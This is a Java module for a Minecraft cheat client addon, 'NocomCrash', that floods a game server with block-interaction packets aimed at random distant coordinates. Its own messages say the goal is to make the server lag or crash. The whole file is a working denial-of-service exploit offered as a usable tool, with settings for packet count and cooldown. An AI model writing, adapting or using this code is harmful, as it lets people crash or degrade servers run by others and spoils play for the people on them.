package sources.net.thenoppy12.noppyaddon.modules;

import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.minecraft.util.math.Vec3i;
import sources.net.thenoppy12.noppyaddon.NoppyAddon;
import sources.net.thenoppy12.noppyaddon.NoppyInit;
import sources.net.thenoppy12.noppyaddon.util.VectorConversionUtil;
import java.util.Random;

// works but cant stop & test in way
public class NocomCrashModule extends Module {
    private final Random random = new Random();
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
    private final Setting<Integer> limit = sgGeneral.add(new IntSetting.Builder()
            .name("Packets")
            .description("Limit packets that send to server")
            .defaultValue(200)
            .range(1, Integer.MAX_VALUE)
            .build()
    );
    private final Setting<Integer> sleep = sgGeneral.add(new IntSetting.Builder()
            .name("Cooldown")
            .description("wait for new packets sending, in integer")
            .defaultValue(10)
            .range(0, 60)
            .build()
    );
    Thread nocomThread = new Thread(() -> {
        try {
            sendPackets(limit.get());
            ChatUtils.info("Done sending, server should start to lag");

        } catch(Exception e) {
            e.printStackTrace();
            ChatUtils.error("Failed to crash, caught " + e.getClass().getSimpleName() + ".");
        }
        this.toggle();
    }, "NocomCrash");

    public NocomCrashModule() {
        super(NoppyInit.CATEGORY,"NocomCrash","basically default NocomCrash hack in Wurst that work under 1.18");
    }
    @Override
    public void onActivate() {
        nocomThread.start();
    }
    @Override
    public void onDeactivate() {
        ChatUtils.info("NocomCrash interrupted by user");
        nocomThread.interrupt();
    }
    private void sendPackets(int nPackets) throws InterruptedException {
        for(int i = 0; i < nPackets; i++) {
            // display current packet
            if(i % 100 == 0 || i == nPackets)
                ChatUtils.info(String.format("%d/%d", i, nPackets));

            if(NoppyAddon.MC.getNetworkHandler() == null)
                break;

            Thread.sleep(sleep.get());

            // generate and send the packet
            PlayerInteractBlockC2SPacket packet = createNocomPacket();
            NoppyAddon.MC.getNetworkHandler().sendPacket(packet);
        }
    }
    public PlayerInteractBlockC2SPacket createNocomPacket() {
        Vec3d pos3d = pickRandomPos();
        Vec3i pos3i = VectorConversionUtil.convert(pos3d);
        BlockHitResult blockHitResult = new BlockHitResult(pos3d, Direction.DOWN, new BlockPos(pos3i), false);

        return new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, blockHitResult, 0);
    }
    private Vec3d pickRandomPos() {
        int x = random.nextInt(16777215);
        int y = random.nextInt(20) + 235;
        int z = random.nextInt(16777215);
        return new Vec3d(x, y, z);
    }
}
